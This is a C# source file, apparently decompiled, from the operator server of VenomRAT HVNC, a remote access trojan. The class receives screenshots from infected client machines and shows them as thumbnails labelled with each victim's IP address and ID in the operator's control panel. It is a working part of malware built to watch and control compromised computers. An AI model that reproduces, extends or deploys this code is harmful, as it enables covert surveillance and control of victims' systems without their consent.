using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Handle_Packet
{
    public class HandleThumbnails
    {
        public HandleThumbnails(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                if (client.LV2 == null)
                {
                    client.LV2 = new ListViewItem();
                    client.LV2.Text = string.Format("{0}:{1}", client.Ip, client.TcpClient.LocalEndPoint.ToString().Split(new char[] { ':' })[1]);
                    client.LV2.ToolTipText = client.ID;
                    client.LV2.Tag = client;
                    using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                    {
                        Program.form1.ThumbnailImageList.Images.Add(client.ID, Image.FromStream(memoryStream));
                        client.LV2.ImageKey = client.ID;
                        object lockListviewThumb = Settings.LockListviewThumb;
                        lock (lockListviewThumb)
                        {
                            Program.form1.listView33.Items.Add(client.LV2);
                        }
                        goto IL_180;
                    }
                }
                using (MemoryStream memoryStream2 = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                {
                    object lockListviewThumb2 = Settings.LockListviewThumb;
                    lock (lockListviewThumb2)
                    {
                        Program.form1.ThumbnailImageList.Images.RemoveByKey(client.ID);
                        Program.form1.ThumbnailImageList.Images.Add(client.ID, Image.FromStream(memoryStream2));
                    }
                }
            IL_180:;
            }
            catch
            {
            }
        }
    }
}
